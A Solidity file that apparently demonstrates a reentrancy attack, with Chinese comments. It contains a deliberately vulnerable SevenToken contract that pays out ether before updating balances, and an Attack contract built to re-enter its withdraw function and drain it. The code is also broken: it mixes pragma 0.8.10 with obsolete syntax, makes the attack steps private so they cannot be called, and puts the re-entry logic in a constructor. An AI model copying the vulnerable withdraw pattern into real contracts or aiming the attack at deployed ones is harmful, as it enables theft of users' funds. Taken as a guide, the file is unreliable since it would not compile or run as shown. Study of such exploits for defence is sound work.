// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
contract SevenToken {
    address owner;
    mapping (address => uint256) balances;  // 记录每个打币者存入的资产情况

    event withdrawLog(address, uint256);
    function SevenToken() { 
        owner = msg.sender; 
    }
    function deposit() payable {
         balances[msg.sender] += msg.value; 
    }
    function withdraw(address to, uint256 amount) public {
        require(balances[msg.sender] > amount);
        require(address(this).balance > amount);
        withdrawLog(to, amount);  // 打印日志，方便观察 reentrancy
        to.call.value(amount)();  // 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部
        balances[msg.sender] -= amount; // 这一步骤应该在 send token 之前
    }
    function balanceOf() public view returns (uint256) { 
        return balances[msg.sender]; 
    }
    function balanceOf(address addr) public view returns (uint256) {
        return balances[addr];
    }
}

contract Attack {
    address owner;
    address victim;
    modifier ownerOnly {
        require(owner == msg.sender); _;
    }
    function Attacks() public payable {
        owner = msg.sender;
    }
    // 设置已部署的 SevenToken 合约实例地址
    function setVictim(address target) ownerOnly public{
        victim = target;
    }
    function balanceOf() public view returns (uint256) {
        return this.balance;
    }

    // deposit Ether to SevenToken deployed
    function step1(uint256 amount) private ownerOnly {
        if (this.balance > amount) {
            victim.call.value(amount)(bytes4(keccak256("deposit()")));
        }
    }
    // withdraw Ether from SevenToken deployed
    function step2(uint256 amount) private ownerOnly {
        victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, amount);
    }
    constructor() payable {
        if (msg.sender == victim) {
            victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, msg.value);
        }
    }
}
